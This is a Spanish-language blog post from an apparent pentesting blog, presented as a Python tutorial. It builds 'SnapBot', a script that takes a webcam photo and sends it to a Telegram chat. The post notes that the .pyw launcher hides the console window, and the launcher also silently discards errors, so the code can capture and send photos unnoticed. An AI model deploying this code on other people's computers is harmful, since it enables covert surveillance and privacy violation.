@@ -1,0 +1,620 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>SnapBot - Python scripting - Hacktivo.io</title>
+<meta name="description" content="Hola a todos, hoy les presentaré un pequeño script en Python que desarrollé hace unos días, llamado SnapBot . Este programa está diseñado para capturar imágenes utilizando la cámara web de tu ordenador y enviarlas directamente a un chat de Telegram que hayas configurado previamente.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Hacktivo.io">
+<meta property="og:title" content="SnapBot - Python scripting">
+<meta property="og:url" content="http://localhost:4000/snapbot-python-scripting/">
+
+
+  <meta property="og:description" content="Hola a todos, hoy les presentaré un pequeño script en Python que desarrollé hace unos días, llamado SnapBot . Este programa está diseñado para capturar imágenes utilizando la cámara web de tu ordenador y enviarlas directamente a un chat de Telegram que hayas configurado previamente.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/script-python-SnapBot/SnapBot1.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2024-07-12T00:00:00+02:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/snapbot-python-scripting/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "0x832",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Hacktivo.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/0x832.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">SnapBot - Python scripting</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="0x832" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">0x832</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentesting y programación
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/0x832" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="SnapBot - Python scripting">
+    <meta itemprop="description" content="Hola a todos, hoy les presentaré un pequeño script en Python que desarrollé hace unos días, llamado SnapBot . Este programa está diseñado para capturar imágenes utilizando la cámara web de tu ordenador y enviarlas directamente a un chat de Telegram que hayas configurado previamente.">
+    <meta itemprop="datePublished" content="July 12, 2024">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">SnapBot - Python scripting
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2024-07-12T00:00:00+02:00">July 12, 2024 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/script-python-SnapBot/SnapBot1.jpg" alt="" /></p>
+
+<p>Hola a todos, hoy enseñaré un pequeño script en Python que desarrollé hace unos días, llamado SnapBot . Este programa está echo para capturar una imágen utilizando la cámara web de tu ordenador y enviarlas a un chat de Telegram que hayas configurado anteriormente. 
+<br /></p>
+
+<h1 id="requisitos">Requisitos</h1>
+<ul>
+  <li>
+    <p>Primero, necesitaremos crear tres archivos: <strong>SnapBot.pyw, config.py y webcam.py.</strong></p>
+
+    <ul>
+      <li>SnapBot.pyw: Con este script se iniciará el programa</li>
+      <li>config.py: Con este otro sé configurará el TOKEN y el ID para que nos llegue la foto al Telegram</li>
+      <li>webcam.py: Y en este script escribiremos la mayoría del código
+<br /></li>
+    </ul>
+  </li>
+</ul>
+
+<h1 id="desarrollo-del-script">Desarrollo del Script</h1>
+<h3 id="1-configuración-del-configpy-"><strong>1. Configuración del config.py :</strong></h3>
+
+<p><strong>Descripción:</strong>
+  Este archivo contiene el token de autenticación y el ID del chat.
+<br /></p>
+
+<p>Primero, vamos a configurar el archivo <strong>config.py</strong> para definir el <strong>TOKEN</strong> y el <strong>CHAT_ID</strong> necesarios para enviar la foto a Telegram.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      <span class="k">def</span> <span class="nf">get_telegram_config</span><span class="p">():</span>
+            <span class="k">return</span> <span class="p">{</span>
+            <span class="s">'TOKEN'</span><span class="p">:</span> <span class="s">''</span><span class="p">,</span> <span class="c1"># Token de autenticación de la API de Telegram
+</span>            <span class="s">'CHAT_ID'</span><span class="p">:</span> <span class="s">''</span> <span class="c1"># Identificador del chat al que se enviará la foto
+</span>            <span class="p">}</span>
+</code></pre></div></div>
+<p><br /></p>
+
+<h3 id="2-configuración-de-webcampy"><strong>2 Configuración de webcam.py</strong></h3>
+
+<p><strong>Descripción:</strong>
+  Este script se encarga de obtener una imagen desde la cámara web y enviarla a Telegram. Aquí es donde está la mayor parte del código.
+  <br /></p>
+
+<ul>
+  <li>
+    <h3 id="1--entramos-al-webcampy-para-importación-de-librerías-"><strong>1- Entramos al webcam.py para importación de Librerías :</strong></h3>
+    <p>En esta sección se importan las librerias necesarias para que el script funcione.</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kn">import</span> <span class="nn">cv2</span> 
+  <span class="kn">import</span> <span class="nn">io</span> 
+  <span class="kn">import</span> <span class="nn">requests</span> 
+  <span class="kn">from</span> <span class="nn">config</span> <span class="kn">import</span> <span class="n">get_telegram_config</span> 
+</code></pre></div>    </div>
+    <ul>
+      <li>
+        <p><strong>Import cv2:</strong> Nos sirve para capturar y procesar imágenes desde la cámara web.</p>
+      </li>
+      <li>
+        <p><strong>Import io:</strong> Sirve para manejar datos de imagen en memoria.</p>
+      </li>
+      <li>
+        <p><strong>Import requests:</strong> Para enviar la imagen a Telegram a través de solicitudes HTTP</p>
+      </li>
+      <li>
+        <p><strong>Import from config import get_telegram_config:</strong> Para obtener la configuración del <code class="language-plaintext highlighter-rouge">config.py</code>
+<br /></p>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <h3 id="2--llamada-al-configpy"><strong>2- Llamada al config.py:</strong></h3>
+    <p>En esta sección, explicaremos cómo se utiliza la función <code class="language-plaintext highlighter-rouge">get_telegram_config()</code> para obtener la configuración necesaria para enviar la imagen a Telegram.</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">def</span> <span class="nf">Captur_webcam</span><span class="p">():</span>
+        <span class="n">telegram_config</span> <span class="o">=</span> <span class="n">get_telegram_config</span><span class="p">()</span>
+        <span class="n">TOKEN</span> <span class="o">=</span> <span class="n">telegram_config</span><span class="p">[</span><span class="s">'TOKEN'</span><span class="p">]</span>
+        <span class="n">CHAT_ID</span> <span class="o">=</span> <span class="n">telegram_config</span><span class="p">[</span><span class="s">'CHAT_ID'</span><span class="p">]</span>
+</code></pre></div>    </div>
+    <ul>
+      <li>
+        <p><strong>get_telegram_config():</strong> Esta función, que se encuentra en <code class="language-plaintext highlighter-rouge">config.py</code>, devuelve los datos con el <code class="language-plaintext highlighter-rouge">TOKEN</code> y el <code class="language-plaintext highlighter-rouge">CHAT_ID</code> necesarios para interactuar con la API de Telegram.</p>
+      </li>
+      <li>
+        <p><strong>telegram_config:</strong> Cuando llamas a <code class="language-plaintext highlighter-rouge">get_telegram_config()</code>, obtienes la configuración de Telegram.</p>
+      </li>
+      <li>
+        <p><strong>TOKEN:</strong> Se obtiene la configuración <code class="language-plaintext highlighter-rouge">telegram_config</code> para autenticar el bot en la API de Telegram.</p>
+      </li>
+      <li>
+        <p><strong>CHAT_ID:</strong> Se obtiene la configuración <code class="language-plaintext highlighter-rouge">telegram_config</code> para especificar el chat al que se enviará la imagen.
+<br /></p>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <h3 id="3--captura-de-imagen-con-la-webcam"><strong>3- Captura de imagen con la webcam:</strong></h3>
+    <p>A continuación, explicaremos cómo usar <code class="language-plaintext highlighter-rouge">OpenCV</code> para tomar una foto con la webcam.</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">cap</span> <span class="o">=</span> <span class="n">cv2</span><span class="p">.</span><span class="n">VideoCapture</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">30</span><span class="p">):</span>
+        <span class="n">cap</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+    <span class="n">ret</span><span class="p">,</span> <span class="n">frame</span> <span class="o">=</span> <span class="n">cap</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+</code></pre></div>    </div>
+    <ul>
+      <li>
+        <p><strong>cv2.VideoCapture(0):</strong> Inicia la webcam del PC.</p>
+      </li>
+      <li>
+        <p><strong>for i in range(30): cap.read():</strong> Realiza 30 lecturas iniciales para iniciar la cámara, ajustando parámetros automáticos como la exposición y el balance de blancos.</p>
+      </li>
+      <li>
+        <p><strong>ret, frame = cap.read():</strong> Captura una imagen de la webcam, donde <code class="language-plaintext highlighter-rouge">ret</code> indica si la captura fue exitosa y <code class="language-plaintext highlighter-rouge">frame</code> contiene la imagen obtenida.
+<br /></p>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <h3 id="4--codificación-y-almacenamiento-de-la-imagen"><strong>4- Codificación y almacenamiento de la imagen:</strong></h3>
+    <p>En esta sección, detallaremos el proceso de codificación y almacenamiento de la imagen capturada desde la webcam utilizando OpenCV y la biblioteca io.</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nb">buffer</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">BytesIO</span><span class="p">()</span>
+    <span class="n">_</span><span class="p">,</span> <span class="n">encoded_image</span> <span class="o">=</span> <span class="n">cv2</span><span class="p">.</span><span class="n">imencode</span><span class="p">(</span><span class="s">'.jpg'</span><span class="p">,</span> <span class="n">frame</span><span class="p">)</span>
+    <span class="nb">buffer</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">encoded_image</span><span class="p">.</span><span class="n">tobytes</span><span class="p">())</span>
+    <span class="n">cap</span><span class="p">.</span><span class="n">release</span><span class="p">()</span>
+</code></pre></div>    </div>
+
+    <ul>
+      <li>
+        <p><strong>buffer = io.BytesIO():</strong> Crea un <code class="language-plaintext highlighter-rouge">buffer en memoria</code> que actuará como un archivo para almacenar la imagen.</p>
+      </li>
+      <li>
+        <p><strong>cv2.imencode(‘.jpg’, frame):</strong> Codifica la imagen capturada <code class="language-plaintext highlighter-rouge">(frame)</code> en formato JPEG.</p>
+      </li>
+      <li>
+        <p><strong>buffer.write(encoded_image.tobytes()):</strong> Escribe los datos de la imagen codificada en el <code class="language-plaintext highlighter-rouge">buffer</code>, convirtiendo primero los datos a <code class="language-plaintext highlighter-rouge">bytes</code> con <code class="language-plaintext highlighter-rouge">tobytes()</code>.</p>
+      </li>
+      <li>
+        <p><strong>cap.release():</strong> Cierra la conexión con la webcam.
+<br /></p>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <h3 id="5--envío-de-la-imagen-a-telegram"><strong>5- Envío de la imagen a Telegram:</strong></h3>
+    <p>En este apartado, explicaré cómo envía la imagen capturada a Telegram utilizando la API de Telegram .</p>
+
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">archivos</span> <span class="o">=</span> <span class="p">{</span><span class="s">'photo'</span><span class="p">:</span> <span class="p">(</span><span class="s">'webcam.jpg'</span><span class="p">,</span> <span class="nb">buffer</span><span class="p">.</span><span class="n">getvalue</span><span class="p">())}</span>
+    <span class="n">datos</span> <span class="o">=</span> <span class="p">{</span><span class="s">'chat_id'</span><span class="p">:</span> <span class="n">CHAT_ID</span><span class="p">}</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'https://api.telegram.org/bot</span><span class="si">{</span><span class="n">TOKEN</span><span class="si">}</span><span class="s">/sendPhoto'</span>
+
+    <span class="n">respuesta</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">datos</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">archivos</span><span class="p">))</span>
+</code></pre></div>    </div>
+    <ul>
+      <li>
+        <p><strong>archivos = {‘photo’: (‘webcam.jpg’, buffer.getvalue())}:</strong> Prepara la imagen para enviar. ‘photo’ es el nombre del campo esperado por Telegram. ‘webcam.jpg’ es el nombre del archivo, y <code class="language-plaintext highlighter-rouge">buffer.getvalue()</code> obtiene los datos de la imagen.</p>
+      </li>
+      <li>
+        <p><strong>datos = {‘chat_id’: CHAT_ID}:</strong> Especifica el identificador del chat <code class="language-plaintext highlighter-rouge">(CHAT_ID)</code> al que se enviará la imagen.</p>
+      </li>
+      <li>
+        <p><strong>url = f’https://api.telegram.org/bot{TOKEN}/sendPhoto’:</strong> Crea la <code class="language-plaintext highlighter-rouge">URL</code> para enviar la foto usando el token del bot <code class="language-plaintext highlighter-rouge">(TOKEN).</code>
+<br /></p>
+      </li>
+    </ul>
+  </li>
+  <li>
+    <h3 id="6--verificación-del-envío"><strong>6- Verificación del envío:</strong></h3>
+    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">if</span> <span class="n">respuesta</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"Foto de la webcam enviada a Telegram"</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s">"Error al enviar la foto a Telegram."</span><span class="p">)</span>
+</code></pre></div>    </div>
+
+    <ul>
+      <li>
+        <p><strong>if respuesta.status_code == 200:</strong> Verifica si la solicitud fue exitosa. El código de estado 200 indica que la imagen se envió correctamente.</p>
+      </li>
+      <li>
+        <p><strong>print(“Foto de la webcam enviada a Telegram”):</strong> Muestra un mensaje de éxito si la solicitud fue exitosa.</p>
+      </li>
+      <li>
+        <p><strong>else:</strong> Si el código de estado no es 200, indica que hubo un error.</p>
+      </li>
+      <li>
+        <p><strong>print(“Error al enviar la foto a Telegram.”):</strong> Muestra un mensaje de error si la solicitud falló.
+<br /></p>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<p>¡Perfecto! Una vez finalizada está parte, vamos a configurar el script que ejecutará todo el proceso.</p>
+
+<h3 id="8-configuración-en-snapbotpy"><strong>8. Configuración en SnapBot.py:</strong></h3>
+
+<p><strong>Descripción:</strong>
+  Este es el script que ejecuta el programa. Su extensión <code class="language-plaintext highlighter-rouge">.pyw</code> sirve para qué se ejecutará sin abrir una ventana de consola en Windows.
+  <br /></p>
+
+<p>Ahora, configuraremos el archivo <strong>SnapBot.pyw</strong> para gestionar la captura de imágenes desde la cámara web.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kn">import</span> <span class="nn">webcam</span> 
+
+    <span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">webcam</span><span class="p">.</span><span class="n">Captur_webcam</span><span class="p">()</span> 
+        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="k">pass</span>
+    <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+        <span class="n">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p><strong>Import webcam:</strong> Se importa el módulo webcam para acceder a las funciones definidas en <code class="language-plaintext highlighter-rouge">webcam.py</code>.</p>
+
+<p><strong>main():</strong> Dentro de esta función, se llama a 
+  <strong>webcam.Captur_webcam():</strong> <code class="language-plaintext highlighter-rouge">webcam:</code> Hace referencia al archivo <code class="language-plaintext highlighter-rouge">webcam.py</code></p>
+
+<p><strong>Captur_webcam():</strong> Es una función definida dentro del archivo <code class="language-plaintext highlighter-rouge">webcam.py</code> que se encarga de capturar la imagen desde la cámara web.</p>
+
+<p><br /></p>
+
+<h1 id="hasta-aquí-llega-nuestro-artículo-explicativo-sobre-cómo-crear-snapbot">Hasta aquí llega nuestro artículo explicativo sobre cómo crear SnapBot.</h1>
+
+<p>Espero que les haya servido la explicación y que haya sido clara. No olviden seguirme en <a href="https://github.com/0x832/">GitHub</a>, ya que iré subiendo nuevos repositorios. Si tienen alguna duda o no saben cómo hacer el script, pueden descargarlo desde <a href="https://github.com/0x832/SnapBot">mi repositorio</a>.</p>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#programaci%C3%B3n" class="page__taxonomy-item" rel="tag">Programación</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2024-07-12T00:00:00+02:00">July 12, 2024</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="#" class="pagination--pager disabled">Previous</a>
+    
+    
+      <a href="/runner-medium/" class="pagination--pager" title="Runner - Medium
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2024 0x832</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
